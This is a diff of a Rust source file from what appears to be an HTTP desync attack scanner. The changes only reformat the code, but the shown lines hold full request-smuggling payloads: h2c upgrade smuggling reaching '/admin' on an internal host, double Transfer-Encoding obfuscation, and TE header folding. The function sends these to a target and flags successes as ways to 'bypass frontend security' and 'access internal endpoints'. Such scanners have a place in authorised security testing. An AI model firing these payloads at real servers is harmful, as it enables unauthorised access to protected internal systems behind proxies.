@@ -236,10 +236,7 @@ const DESYNC_PAYLOADS: &[(&str, &str, &[(&str, &str)])] = &[
     (
         "h2c smuggling with body",
         "POST / HTTP/1.1\r\nHost: target\r\nConnection: Upgrade\r\nUpgrade: h2c\r\nContent-Length: 52\r\n\r\nGET /admin HTTP/1.1\r\nHost: internal\r\n\r\n",
-        &[
-            ("Connection", "Upgrade"),
-            ("Upgrade", "h2c"),
-        ],
+        &[("Connection", "Upgrade"), ("Upgrade", "h2c")],
     ),
     (
         "HTTP/2 downgrade to HTTP/1.1",
@@ -280,9 +277,7 @@ const DESYNC_PAYLOADS: &[(&str, &str, &[(&str, &str)])] = &[
     (
         "Double TE obfuscation",
         "POST / HTTP/1.1\r\nHost: target\r\nTransfer-Encoding: chunked\r\nTransfer-Encoding: identity\r\nContent-Length: 6\r\n\r\n0\r\n\r\nX",
-        &[
-            ("Transfer-Encoding", "chunked"),
-        ],
+        &[("Transfer-Encoding", "chunked")],
     ),
     (
         "TE header folding",
@@ -297,10 +292,17 @@ const DESYNC_PAYLOADS: &[(&str, &str, &[(&str, &str)])] = &[
 ];
 
 pub async fn desync(url: &str, token: Option<&str>, timeout: u64) -> anyhow::Result<()> {
-    println!("{} HTTP Desync Attack v2 (h2c / HTTP/2 Downgrade)", "[*]".cyan().bold());
+    println!(
+        "{} HTTP Desync Attack v2 (h2c / HTTP/2 Downgrade)",
+        "[*]".cyan().bold()
+    );
     println!("{}", "=".repeat(60).cyan());
     println!("{} URL: {}", "[*]".cyan().bold(), url);
-    println!("{} {} desync payloads", "[*]".cyan().bold(), DESYNC_PAYLOADS.len());
+    println!(
+        "{} {} desync payloads",
+        "[*]".cyan().bold(),
+        DESYNC_PAYLOADS.len()
+    );
     println!("{}", "-".repeat(60).dimmed());
 
     let client = build_client(timeout, token);
@@ -359,7 +361,11 @@ pub async fn desync(url: &str, token: Option<&str>, timeout: u64) -> anyhow::Res
                 );
 
                 if h2c_upgraded || has_101 || has_smuggled {
-                    println!("    {} {}", ">".red().bold(), resp_body.chars().take(200).collect::<String>());
+                    println!(
+                        "    {} {}",
+                        ">".red().bold(),
+                        resp_body.chars().take(200).collect::<String>()
+                    );
                     results.push(*name);
                 }
             }
@@ -397,15 +403,26 @@ pub async fn desync(url: &str, token: Option<&str>, timeout: u64) -> anyhow::Res
             println!("  {} {}", "*".red(), name);
         }
         let has_h2c = results.iter().any(|n| n.contains("h2c"));
-        let has_smuggled = results.iter().any(|n| n.contains("smuggl") || n.contains("downgrade"));
+        let has_smuggled = results
+            .iter()
+            .any(|n| n.contains("smuggl") || n.contains("downgrade"));
         if has_h2c {
-            println!("\n{} [CRITICAL] h2c upgrade smuggling possible — bypass frontend security!", "[!]".red().bold());
+            println!(
+                "\n{} [CRITICAL] h2c upgrade smuggling possible — bypass frontend security!",
+                "[!]".red().bold()
+            );
         }
         if has_smuggled {
-            println!("{} [CRITICAL] HTTP request smuggling confirmed — access internal endpoints!", "[!]".red().bold());
+            println!(
+                "{} [CRITICAL] HTTP request smuggling confirmed — access internal endpoints!",
+                "[!]".red().bold()
+            );
         }
     } else {
-        println!("{} No desync vulnerabilities detected.", "[-]".green().bold());
+        println!(
+            "{} No desync vulnerabilities detected.",
+            "[-]".green().bold()
+        );
     }
 
     Ok(())
